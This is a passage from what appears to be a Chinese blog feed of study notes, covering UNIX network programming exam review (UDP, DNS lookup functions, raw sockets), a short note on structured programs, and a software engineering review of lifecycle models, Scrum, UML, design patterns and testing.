<code>recvfrom()</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token class-name">ssize_t</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> <span class="token function">sendto</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span>Both <span class="token keyword">return</span><span class="token operator">:</span> number of bytes read or written <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>echo 程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">Socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="服务器进程未运行"><a href="#服务器进程未运行" class="headerlink" title="服务器进程未运行"></a>服务器进程未运行</h4><p>返回 ICMP 异步错误</p><p>sendto成功返回仅表示接口输出队列中有存放数据报的空间</p><p>仅在进程已将其UDP套接字<strong>连接</strong>到<strong>一</strong>个对端后，这些异步错误才返回给进程</p><h4 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h4><ul><li>不需要再指定 目的IP和端口号</li><li>不用recvfrom 用 read 就行</li><li>返回异步错误</li></ul><h3 id="Chapter-11"><a href="#Chapter-11" class="headerlink" title="Chapter 11"></a>Chapter 11</h3><p>​    简单前面部分 DNS 操作 11.3、11.4、11.5</p><p>使用 UDP 查询，如果答案太长，超出了UDP承载能力，换成TCP</p><h4 id="gethostbyname"><a href="#gethostbyname" class="headerlink" title="gethostbyname"></a>gethostbyname</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>hostname<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> non<span class="token operator">-</span>null pointer <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token constant">NULL</span> on error with h_errno set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只能返回ipv4，getaddrinfo 能够处理4和6</p><h4 id="gethostbyaddr"><a href="#gethostbyaddr" class="headerlink" title="gethostbyaddr"></a>gethostbyaddr</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span><span class="token function">gethostbyaddr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> family<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> non<span class="token operator">-</span>null pointer <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token constant">NULL</span> on error with h_errno set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token keyword">struct</span> <span class="token class-name">servent</span> <span class="token operator">*</span><span class="token function">getservbyname</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>servname<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>protoname<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> non<span class="token operator">-</span>null pointer <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token constant">NULL</span> on erro<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token keyword">struct</span> <span class="token class-name">servent</span> <span class="token operator">*</span><span class="token function">getservbyport</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>protoname<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> non<span class="token operator">-</span>null pointer <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token constant">NULL</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Part-3-Advanced-Sockets"><a href="#Part-3-Advanced-Sockets" class="headerlink" title="Part 3 Advanced Sockets"></a>Part 3 Advanced Sockets</h2><p>12，13，14，15 ，17，18.5,20,21,22,23,24，30，31不考  Daemon Process 了解一下</p><p>19 Introduction </p><p>特权  SA ， SADB</p><p>25 掌握，结合第 5 章看</p><p>26 掌握 基本概念，线程和进程区别</p><p>27 结合前面的 Options 一起看，简单看看。</p><p>28  重点掌握</p><p>读写ICMP，读写非内核处理的协议段的数据报，构建ip首部</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> protocol<span class="token punctuation">)</span><span class="token comment">// 例 ： protocol IPPROTO_ICMP</span><span class="token comment">// 开启 IP_HDRINCL</span><span class="token keyword">const</span> <span class="token keyword">int</span> on <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> IPPROTO_IP<span class="token punctuation">,</span> IP_HDRINCL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>on<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>on<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">// 出错处理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>29 掌握 基本概念，如何抓包</p><p>libpcap 公开分组捕获函数库</p><p>A.3 C.1  netstat tcpdump </p><p>简答题（解释名词） ， 编程题（补充小的片段）上机+上课 ， 实验分析题（分析实验的结果）例如： 服务端没起来 报什么错误</p><p>最开始 那个 <strong>带函数的函数</strong> </p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>P180，P165，LINGER 的意思是什么</p><p>ioctl  实现 sockopt 进行读写操作 - 了解功能</p><p>函数原型 ： 名字 + 参数</p><p>ping ， recvmsg 如果被中断 <code>EINTR</code>，continue 重新执行，函数重启</p><p>5.10 wait / waitpid 要求</p><p>server ， server host 情况</p><p>raw socket 适用于什么情况 routing 、key</p><p>29 introduction</p><p>信号处理函数  5 章 signal handler</p><p>signal driven 不要求</p><p>tcp函数的顺序图</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> UNIX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何判断结构化程序</title>
      <link href="/2021/03/11/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%BB%93%E6%9E%84%E5%8C%96%E7%A8%8B%E5%BA%8F/"/>
      <url>/2021/03/11/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%BB%93%E6%9E%84%E5%8C%96%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>本文是希望使用 一个定义，一个方法，对结构化程序的定义进行细化</p><p>一个定义： 每个程序单元只有一个入口和一个出口，但是分支结构例外</p><p>一个方法：对分支结构进行合并，如何合并（一个层级的才能合并），使整体结构符合定义</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>软件工程复习</title>
      <link href="/2021/03/11/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/03/11/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本文是大三上 <code>软件工程</code> 科目的复习</p><a id="more"></a><h1 id="软件工程复习"><a href="#软件工程复习" class="headerlink" title="软件工程复习"></a>软件工程复习</h1><p>软件工程三要素： 方法 工具 和 过程</p><h2 id="软件开发方法"><a href="#软件开发方法" class="headerlink" title="软件开发方法*"></a>软件开发方法*</h2><h3 id="传统开发方法"><a href="#传统开发方法" class="headerlink" title="传统开发方法"></a>传统开发方法</h3><p>结构化方法：分阶段的， 顺序的，依赖性</p><p>缺点： 缺少灵活性，静态，缺少应对变化的能力</p><h3 id="面向对象方法"><a href="#面向对象方法" class="headerlink" title="面向对象方法"></a>面向对象方法</h3><p>将软件构件划分为 <strong>类</strong>，并定义一组 静态的 <strong>变量</strong> 和 动态的 <strong>方法</strong> </p><p>利用父子类和<strong>继承</strong>的关系形成 <strong>层次结构</strong> ，</p><p><strong>封装性</strong>：对象间仅能通过发送消息互相联系</p><p>通过<strong>反复迭代</strong>开发软件，降低<strong>复杂性</strong>，提高<strong>可理解性</strong>，支持<strong>软件重用</strong></p><p>更好的应对变化</p><h2 id="软件开发各阶段活动及任务"><a href="#软件开发各阶段活动及任务" class="headerlink" title="软件开发各阶段活动及任务*"></a>软件开发各阶段活动及任务*</h2><ul><li>可行性分析 ： 高层次需求分析  - 技术，经济，社会</li><li>需求分析：进行<strong>变更管理</strong> 适应变化，分为<strong>功能性</strong>和<strong>非功能性</strong>，输出<strong>需求规格说明书</strong></li><li>软件设计：概要+详细</li><li>程序编码</li><li>软件测试： 单元-&gt;集成-&gt;系统，分为黑盒和白盒</li><li>软件维护:  改正性，适应性，完善性，预防性</li></ul><h2 id="生命周期模型"><a href="#生命周期模型" class="headerlink" title="生命周期模型"></a>生命周期模型</h2><h3 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型*"></a>瀑布模型*</h3><p>传统开发方法 <strong>最广泛</strong>，顺序性，依赖性</p><p>推迟写代码，每个阶段都写文档</p><p>缺点：用户参与少，静态</p><h3 id="快速原型模型"><a href="#快速原型模型" class="headerlink" title="快速原型模型*"></a>快速原型模型*</h3><p>看名</p><p>优点： 用户参与多了</p><p>缺点： 原型大概率抛弃</p><h4 id="增量模型"><a href="#增量模型" class="headerlink" title="增量模型"></a>增量模型</h4><p>分为功能模块，逐步实现（开放架构）</p><h4 id="螺旋模型"><a href="#螺旋模型" class="headerlink" title="螺旋模型"></a>螺旋模型</h4><p>瀑布+快速原型+风险分析</p><p>每阶段增加风险分析，降低风险</p><h3 id="喷泉模型"><a href="#喷泉模型" class="headerlink" title="喷泉模型*"></a>喷泉模型*</h3><p>迭代和无缝</p><p>总目标： 线性过程</p><p>*<em>迭代**</em> 逐步求精，面向对象</p><h2 id="敏捷"><a href="#敏捷" class="headerlink" title="敏捷"></a>敏捷</h2><h3 id="敏捷宣言"><a href="#敏捷宣言" class="headerlink" title="敏捷宣言"></a>敏捷宣言</h3><ul><li>个体+互动 &gt; 流程+工具</li><li>软件 &gt; 文档</li><li>客户合作 &gt; 合同谈判</li><li>相应变化 &gt; 遵循计划</li></ul><h3 id="增量-和-迭代"><a href="#增量-和-迭代" class="headerlink" title="增量 和 迭代"></a>增量 和 迭代</h3><p>系统由三个模块构成， </p><ul><li><p>增量：一个个实现 。 </p></li><li><p>迭代，实现三个垃圾模块，再一步步求精。</p></li></ul><h3 id="SCRUM"><a href="#SCRUM" class="headerlink" title="SCRUM*"></a>SCRUM*</h3><p><strong>冲刺 Sprint</strong> ： 一个工作周期</p><ul><li>产品订单： 项目的概要文档，以天为单位</li><li>冲刺订单 ： 小文档，以16小时为单位</li><li>燃尽图： to-do list</li></ul><p>角色</p><ul><li>产品拥有者 ： 甲方领导</li><li>利益相关者 ： 客户</li><li>专家 ： 技术总监</li><li>团队成员 ： 程序员</li></ul><p>活动</p><ul><li>计划会： 冲刺初制定计划</li><li>每日立会： 每天15分钟</li><li>评审会： 冲刺结束前</li><li>反思会/回顾会 ： 冲刺结束后</li></ul><p>XP 于 SCRUM 区别</p><table><thead><tr><th></th><th>XP</th><th>SCRUM</th></tr></thead><tbody><tr><td>迭代长度</td><td>1-2周</td><td>3-4周</td></tr><tr><td>迭代中是否允许修改需求</td><td>yes</td><td>no</td></tr><tr><td>迭代中是否按优先级实现</td><td>yes</td><td>no</td></tr><tr><td>是否采用严格工程方法，保证进度质量</td><td>yes</td><td>no</td></tr></tbody></table><h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h4><p>自动化，高度依赖工具</p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><h3 id="用户-amp-系统"><a href="#用户-amp-系统" class="headerlink" title="用户 &amp; 系统"></a>用户 &amp; 系统</h3><ul><li>系统需求是对用户需求的细化和完善</li><li>系统需求的阅读对象是开发者，用户需求是客户</li><li>系统需求是用户需求的开始</li><li>目标 &amp; 涉众</li></ul><h3 id="涉众"><a href="#涉众" class="headerlink" title="涉众"></a>涉众</h3><p>与目标系统相关的一切人和物</p><h3 id="系统功能的确定"><a href="#系统功能的确定" class="headerlink" title="系统功能的确定"></a>系统功能的确定</h3><p><strong>正式</strong>和<strong>非正式</strong>的<strong>访谈</strong></p><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>用例-&gt;规约用例并生成文档-&gt;活动图-&gt;文字功能性需求</p><h4 id="三种功能性需求"><a href="#三种功能性需求" class="headerlink" title="三种功能性需求"></a>三种功能性需求</h4><p>系统功能需求 + 交互需求 + 外部接口需求</p><h4 id="需求说明书"><a href="#需求说明书" class="headerlink" title="需求说明书"></a>需求说明书</h4><p>文档+涉众+目标+功能，非功能+交付物+验收标准+附件</p><h4 id="需求跟踪"><a href="#需求跟踪" class="headerlink" title="需求跟踪"></a>需求跟踪</h4><p>业务，—–需求， 类模型  三者递归确定，互有对应</p><p>   |————-| ———|  -</p><p>活动图，需求文档，类图</p><p>提高完备性，同时检查是否有冗余（有没有缺的，多的）</p><h2 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h2><h4 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h4><p>构件 + 连接件 + 配置</p><h3 id="数据流风格"><a href="#数据流风格" class="headerlink" title="数据流风格"></a>数据流风格</h3><p><strong>管道与过滤器</strong>： 信息隐藏，高内聚低耦合，可以灵活组合</p><p><strong>层次系统</strong> ：计算机网络</p><p><strong>正交软件架构</strong>：</p><ul><li><p>层 ： 一组具有相同抽象级别的构件</p></li><li><p>线索： 用例形成的调用关系</p></li><li><p>好处：每个需求变动仅影响某一条线索</p></li></ul><p><strong>客户机服务器架构</strong>: </p><ul><li>一个服务器服务多个客户端</li><li>适应变化，灵活</li><li>易于对系统进行扩充和缩小</li><li>功能构建隔离</li></ul><p><strong>浏览器/服务器架构</strong> : 基本同上+抽取client的function形成的web服务器</p><h3 id="独立构建风格"><a href="#独立构建风格" class="headerlink" title="独立构建风格"></a>独立构建风格</h3><h4 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构*"></a>MVC架构*</h4><ul><li><p>Model: 企业数据和业务规则</p></li><li><p>View：用户看到并与之交互的界面</p></li><li><p>Controller：根据输入调用模型和视图去完成用户的需求，不输出结果，不做任何处理</p></li></ul><h3 id="数据中心风格-仓库系统"><a href="#数据中心风格-仓库系统" class="headerlink" title="数据中心风格 - 仓库系统"></a>数据中心风格 - 仓库系统</h3><p>星型结构，中央数据库和周边client</p><p>黑板系统：中央数据库将状态通知client，由client决定选择</p><h2 id="类的分析与设计"><a href="#类的分析与设计" class="headerlink" title="类的分析与设计"></a>类的分析与设计</h2><p>迭代逐级细化</p><h4 id="类的种类"><a href="#类的种类" class="headerlink" title="类的种类"></a>类的种类</h4><ul><li>实体类：存储，传递数据的类，名词</li><li>控制类：管理类，体现执行逻辑，动宾</li><li>边界类：外部用户交互，界面类，数据交换类</li></ul><h4 id="领域模型"><a href="#领域模型" class="headerlink" title="领域模型"></a>领域模型</h4><p>初始类图-实体类</p><h5 id="实体类-lt-lt-entity-gt-gt"><a href="#实体类-lt-lt-entity-gt-gt" class="headerlink" title="实体类 &lt;&lt;entity&gt;&gt;"></a>实体类 <code>&lt;&lt;entity&gt;&gt;</code></h5><ul><li>类名 ： 构造性</li><li>变量：<ul><li>可见性 (private , public ..) - (-,+,_,~)</li><li>依赖（计算）属性，(/)</li><li>名字 ： </li><li>类型 ： UML定义的，int String…</li><li>下划线：表示静态</li></ul></li></ul><p>没有方法</p><h4 id="类的关系"><a href="#类的关系" class="headerlink" title="类的关系*"></a>类的关系*</h4><ul><li>关联关系 ： 静态，拥有，长期持久</li><li>导航方向 ： 箭头 ， 包含关系</li><li>依赖关系 ： 动态，临时 - 避免双向依赖</li><li>依赖 包含 关联</li></ul><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><ul><li><u>对象名：类的类型</u></li><li>实例变量 = 初始值</li><li>对象名为空代表匿名对象，类名为空代表有上下文</li></ul><h4 id="管理类-amp-控制类"><a href="#管理类-amp-控制类" class="headerlink" title="管理类 &amp; 控制类"></a>管理类 &amp; 控制类</h4><table><thead><tr><th></th><th>管理类</th><th>控制类</th></tr></thead><tbody><tr><td></td><td>不考虑get，set方法</td><td>隔离边界与实体</td></tr><tr><td>对象</td><td>对于同类对象的协调和管理</td><td>不同类</td></tr><tr><td>层</td><td>Domain层</td><td>业务控制层</td></tr><tr><td>作用</td><td>创建对象，代理访问其他对象</td><td>一个用例一个</td></tr></tbody></table><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>利用抽象类隔离变化</p><p>空三角箭头表示继承</p><h4 id="枚举类-lt-lt-enumeration-gt-gt"><a href="#枚举类-lt-lt-enumeration-gt-gt" class="headerlink" title="枚举类 &lt;&lt;enumeration&gt;&gt;"></a>枚举类 <code>&lt;&lt;enumeration&gt;&gt;</code></h4><h4 id="界面设计："><a href="#界面设计：" class="headerlink" title="界面设计："></a>界面设计：</h4><p>对实体，生成 <code>ProjectMask</code> 代理类</p><h4 id="CASE工具"><a href="#CASE工具" class="headerlink" title="CASE工具"></a>CASE工具</h4><p>软件开发环境，计算机辅助软件工程</p><h2 id="类的关系-1"><a href="#类的关系-1" class="headerlink" title="类的关系"></a>类的关系</h2><h4 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h4><table><thead><tr><th>是否要求顺序</th><th>是否要求唯一性</th><th></th></tr></thead><tbody><tr><td>no</td><td>yes</td><td>Set</td></tr><tr><td>no</td><td>no</td><td>Bag/Multiset</td></tr><tr><td>yes</td><td>yes</td><td>OrderedSet</td></tr><tr><td>yes</td><td>no</td><td>List/Sequence</td></tr></tbody></table><p>适用模板类而非具体类</p><h4 id="聚合-聚集"><a href="#聚合-聚集" class="headerlink" title="聚合 - 聚集"></a>聚合 - 聚集</h4><p>部分与整体，共享</p><h4 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h4><p>存在依赖性 - 同生共死</p><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><p>访问的瞬时性 - 用参数</p><h2 id="类的详细设计"><a href="#类的详细设计" class="headerlink" title="类的详细设计"></a>类的详细设计</h2><p>算法+数据结构+物理结构</p><p>其他设计+详细设计说明书+评审</p><p>什么是结构化的程序</p><h4 id="盒图"><a href="#盒图" class="headerlink" title="盒图"></a>盒图</h4><p>图例：不允许随意跳转 - 向里嵌套</p><h4 id="PAD图"><a href="#PAD图" class="headerlink" title="PAD图"></a>PAD图</h4><p>问题分析图 - 向右嵌套</p><h4 id="判定表"><a href="#判定表" class="headerlink" title="判定表"></a>判定表</h4><p>使用“—”来表 示对此条件的不关心或不适用</p><p>判定树： 结点-选择，叶子-结果</p><h4 id="PDL"><a href="#PDL" class="headerlink" title="PDL"></a>PDL</h4><p>人话版的C语言</p><h4 id="OCL-？"><a href="#OCL-？" class="headerlink" title="OCL ？"></a>OCL ？</h4><p>再看看</p><h2 id="设计优化"><a href="#设计优化" class="headerlink" title="设计优化"></a>设计优化</h2><h4 id="smell"><a href="#smell" class="headerlink" title="smell"></a>smell</h4><p>僵化性，脆弱性，顽固性，粘滞性，复杂，重复，晦涩</p><h4 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h4><ul><li>与父类方法有相似的行为，细节调整</li><li>相同条件工作，子类不应具有比其父类更严格的条件限制 - <strong>Liskov替换原则</strong></li><li>重写的方法最高不能超出父类方法的状态。</li></ul><p>循环依赖：提取接口</p><p>狎昵关系： 两个类过分亲密，高耦合</p><p>接口隔离原则：接口的稳定，适应变化，同一个类提取不同的接口</p><p>依赖倒置原则：依赖于抽象</p><p>开放封闭原则： 扩展开放，修改封闭</p><p>单一职责原则：单一功能</p><p>合成/聚合复用原则：尽量使用合成/聚合 形式的委托重用，尽量不使用继承重用</p><blockquote><p>子类是父类的特殊类型</p></blockquote><h3 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h3><ul><li>架构模式： MVC，层次等</li><li>设计模式：抽象工程之类的</li><li>实现模式：具体到写代码，类名，变量名，函数名。。</li></ul><table><thead><tr><th></th><th>创建模式</th><th>结构模式</th><th>行为模式</th></tr></thead><tbody><tr><td>类</td><td>抽象工厂</td><td>适配器</td><td>观察者模式</td></tr><tr><td>类</td><td>单例</td><td>桥 - 装饰</td><td>策略模式</td></tr><tr><td>类</td><td></td><td>代理</td><td>状态</td></tr><tr><td>类</td><td></td><td>门面</td><td></td></tr></tbody></table><h5 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h5><p>工厂表示一组产品的打包，不同的工厂对应不同的组合</p><p>抽象工厂是一个接口，用于生成一组对象，实际对象根据类别又有自己的接口</p><p>低耦合，且添加新的更容易</p><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>管理类或控制类系统中只需要一个实例，该实例在程序中被创建</p><p>要求类的构造方法是私有的，有公有的方法获取该类的实例，实例变量为私有或受保护的。</p><h4 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h4><p>利用 适配器进行接口的转换</p><h4 id="桥模式"><a href="#桥模式" class="headerlink" title="桥模式"></a>桥模式</h4><p>先将不同的变化维度（单一职责原则）分离，每个维度都有独立的抽象和继承结构，建立<strong>抽象耦合</strong></p><h4 id="装饰模式"><a href="#装饰模式" class="headerlink" title="装饰模式"></a>装饰模式</h4><p>对于负数功能，若将其归入不同的变化维度太多了，归入装饰器</p><p>将Bridge中的抽象 和实现合二为一了，是其特殊形式</p><h4 id="门面模式"><a href="#门面模式" class="headerlink" title="门面模式"></a>门面模式</h4><p>外部与一个子系统的通信必须通过一个统一的门面对象，且单例</p><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p>中介，负责资源的中间处理，节省主体的时间</p><p>用来对有价值稀缺资源的管理，比如数据库的连接等，提高资源的利用率或系统性能</p><h4 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h4><p>MVC适用了观察者</p><p>当主题对象在状态上发生变化时，会通知所有观察者对象，使它们能够自动更新自己</p><h4 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h4><p>将每一个<strong>算法</strong>封装到具有共同接口的独立的类中</p><p>灵活可以相互替换</p><h4 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h4><p>使用一个具有多个子类的类，提前创建所有对应的子类，状态变化时换类</p><h2 id="软件测试"><a href="#软件测试" class="headerlink" title="软件测试"></a>软件测试</h2><p>测试的通过并不能用来证明整个系统是正确的</p><h4 id="测试V模型-测试"><a href="#测试V模型-测试" class="headerlink" title="测试V模型  + 测试*"></a>测试V模型  + 测试*</h4><table><thead><tr><th>测试名称</th><th>开发阶段</th><th>测试对象</th><th>测试方法</th></tr></thead><tbody><tr><td>单元测试</td><td>实现</td><td>类测试</td><td>白盒测试</td></tr><tr><td>集成测试</td><td>系统设计</td><td>包或系统测试-交互</td><td>灰盒测试</td></tr><tr><td>系统测试</td><td>系统需求</td><td>构件和接口测试</td><td>黑盒测试</td></tr><tr><td>验收测试</td><td>客户需求</td><td>现场复现</td><td>黑盒测试</td></tr></tbody></table><p>为什么要早修正</p><ul><li>涉及的范围越来越广泛</li><li>曾经付出的成本越来越高</li></ul><p>看一眼 P9 左下图</p><h5 id="非功能测试"><a href="#非功能测试" class="headerlink" title="非功能测试"></a>非功能测试</h5><p>峰值 ， 尖峰， 压力 ， 浸泡</p><h4 id="软件度量"><a href="#软件度量" class="headerlink" title="软件度量"></a>软件度量</h4><h5 id="McCabe-控制流图"><a href="#McCabe-控制流图" class="headerlink" title="McCabe + 控制流图"></a>McCabe + 控制流图</h5><p>边数 - 点数 + 2 = 分支结点+1</p><h5 id="LCOM"><a href="#LCOM" class="headerlink" title="LCOM"></a>LCOM</h5><p>$$<br>LCOM = \frac{(\frac 1 a \sum_{j=1}^{a}\mu(A_j))-m}{1-m}<br>$$</p><p>m为方法数，a为所含的实例变量数， 为访问每个实例变量的方法数。</p><h4 id="等价类测试-黑盒"><a href="#等价类测试-黑盒" class="headerlink" title="等价类测试 - 黑盒"></a>等价类测试 - 黑盒</h4><ul><li>数值：一般，一个有效，两个无效</li><li>其他： 一个有效，一个无效</li><li>传统 + 强等价类方法</li><li>边界值分析 ：对数值边界创建有效或无效等价类</li></ul><h4 id="控制流-的-覆盖测试-白盒"><a href="#控制流-的-覆盖测试-白盒" class="headerlink" title="控制流 的 覆盖测试  - 白盒"></a>控制流 的 覆盖测试  - 白盒</h4><ul><li>语句覆盖 - 结点</li><li>分支覆盖 - 边</li><li>条件覆盖 - 原子谓词真假</li></ul><p>满足分支覆盖要求一定会满足语句覆盖要求</p><ul><li><p>分支覆盖不能覆盖条件，因为条件是原子谓词判断，但对于组合条件可能会有诸如短路的情况</p></li><li><p>条件不能覆盖分支，因为是 2*原子谓词，可能有没覆盖到的情况</p></li></ul><p>分支 ，条件 并不完全覆盖，综合一下</p><ul><li><p>多条件组合覆盖 - 原子谓词及其组合覆盖</p></li><li><p>基本路径测试 - 独立路径 （ 独立路径要求在路径中至少含有一条<strong>未曾使用</strong>过的边）</p><ul><li> &lt;= V(G)</li></ul></li></ul><h4 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h4><h4 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h4><p>可测试性 - 彼此依赖而需要 模拟程序 或 桩</p><p>设计简单方法</p><p>避免私有方法</p><p>优先使用通用方法</p><p>组合优于继承</p><p>避免隐藏的依赖关系与全局状态</p><h4 id="人工测试"><a href="#人工测试" class="headerlink" title="人工测试"></a>人工测试</h4><p>审查 - 评审 - 走查</p><h2 id="CMMI"><a href="#CMMI" class="headerlink" title="CMMI"></a>CMMI</h2><p>统一的，明确定义的组织级软件工程</p><p>初始级 - 已管理 - 已定义 - 已量化管理 - 优化</p><h1 id="UML"><a href="#UML" class="headerlink" title="UML"></a><strong>UML</strong></h1><h3 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h3><p>注意同一个图中的用例在同一个抽象级别</p><h4 id="角色-Actor"><a href="#角色-Actor" class="headerlink" title="角色 Actor"></a>角色 Actor</h4><p>人或软件系统，使用系统，与系统有关系</p><h4 id="寻找用例"><a href="#寻找用例" class="headerlink" title="寻找用例"></a>寻找用例</h4><p>自己理解吧</p><h4 id="包含关系-lt-lt-include-gt-gt"><a href="#包含关系-lt-lt-include-gt-gt" class="headerlink" title="包含关系  &lt;&lt;include&gt;&gt;"></a>包含关系  <code>&lt;&lt;include&gt;&gt;</code></h4><p>一些通用，共同基础过程的功能，避免重复实现 - 非逻辑分解</p><p><strong>关键词</strong>： 依赖，包含</p><h4 id="扩展关系-lt-lt-extend-gt-gt"><a href="#扩展关系-lt-lt-extend-gt-gt" class="headerlink" title="扩展关系 &lt;&lt;extend&gt;&gt;"></a>扩展关系 